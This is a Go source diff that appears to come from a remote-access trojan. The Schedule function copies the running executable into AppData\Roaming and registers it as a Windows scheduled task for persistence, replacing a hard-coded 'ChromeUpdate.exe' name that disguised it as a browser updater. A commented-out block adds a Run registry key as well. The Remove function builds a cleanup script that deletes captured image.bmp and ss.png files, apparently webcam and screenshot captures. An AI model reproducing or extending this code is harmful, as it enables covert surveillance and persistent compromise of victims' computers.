@@ -18,10 +18,24 @@ func Schedule(connection net.Conn) (err error) {
 	command_raw, err := reader.ReadString('\n')
 	command := strings.TrimSpace(command_raw)
 	fmt.Println(command)
+
 	home, _ := os.UserHomeDir()
-	com := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
-	if com != nil {
-		panic(com)
+
+	appdata := filepath.Join(home, "AppData\\Roaming")
+	exe_name := filepath.Base(os.Args[0])
+	appdata_with_exe := appdata + "\\" + exe_name
+	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
+	xml_path := appdata + "\\schtask.xml"
+
+	fmt.Println("appdata : ", appdata)
+	fmt.Println("exe_name : ", exe_name)
+	fmt.Println("appdata_with_exe : ", appdata_with_exe)
+	fmt.Println("without_exe : ", without_ext)
+	fmt.Println("xml_path : ", xml_path)
+
+	appdata_cd_command := os.Chdir(appdata)
+	if appdata_cd_command != nil {
+		panic(appdata_cd_command)
 	}
 
 	xml_data := "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.4\">" +
@@ -69,7 +83,7 @@ func Schedule(connection net.Conn) (err error) {
 		"\n</Settings>" +
 		"\n<Actions Context=\"Author\">" +
 		"\n<Exec>" +
-		"\n<Command>" + filepath.Join(home, "AppData\\Roaming") + "\\ChromeUpdate.exe</Command>" +
+		"\n<Command>" + appdata_with_exe + "</Command>" +
 		"\n</Exec>" +
 		"\n</Actions>" +
 		"\n</Task>"
@@ -86,23 +100,27 @@ func Schedule(connection net.Conn) (err error) {
 	}
 	err = file.Close()
 
-	file_loc := filepath.Join(home, "AppData\\Roaming") + "\\ChromeUpdate.exe"
-	fmt.Println(file_loc)
-
-	c := exec.Command("powershell", "schtasks", "/DELETE", "/TN", "ChromeUpdate", "/F")
+	c := exec.Command("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")
 	if err := c.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
 
-	c1 := exec.Command("powershell", "Copy-Item", "C:\\Users\\Anonymous\\Desktop\\CommandCam-master\\ChromeUpdate.exe", filepath.Join(home, "AppData\\Roaming"))
+	fmt.Println("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")
+
+	c1 := exec.Command("powershell", "Copy-Item", os.Args[0], appdata)
 	if err := c1.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
 
-	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", "ChromeUpdate", "/xml", filepath.Join(home, "AppData\\Roaming\\schtask.xml"))
+	fmt.Println("C1", "powershell", "Copy-Item", os.Args[0], appdata)
+
+	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
 	if err := c2.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
+
+	fmt.Println("C2 : ", "powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
+
 	/*
 		c3 := exec.Command("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
 		if err := c3.Run(); err != nil {
@@ -122,11 +140,19 @@ func Schedule(connection net.Conn) (err error) {
 
 func Remove(connection net.Conn) (err error) {
 
-	content := "schtasks /DELETE /TN ChromeUpdate /F" +
-		"\ndel %AppData%\\\\schtask.xml" +
+	home, _ := os.UserHomeDir()
+	appdata := filepath.Join(home, "AppData\\Roaming")
+	exe_name := filepath.Base(os.Args[0])
+	appdata_with_exe := appdata + "\\" + exe_name
+	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
+	xml_path := appdata + "\\schtask.xml"
+
+	content := "schtasks /DELETE /TN " + without_ext + " /F" +
+		"\ndel " + xml_path +
 		"\ndel %AppData%\\\\image.bmp" +
-		"\ntaskkill /im ChromeUpdate.exe /f" +
-		"\ndel %AppData%\\\\ChromeUpdate.exe" +
+		"\ndel %AppData%\\\\ss.png" +
+		"\ntaskkill /im " + exe_name + " /f" +
+		"\ndel " + appdata_with_exe +
 		"\n" +
 		"\nrem SETLOCAL" +
 		"\nrem SET someOtherProgram=SomeOtherProgram.exe" +
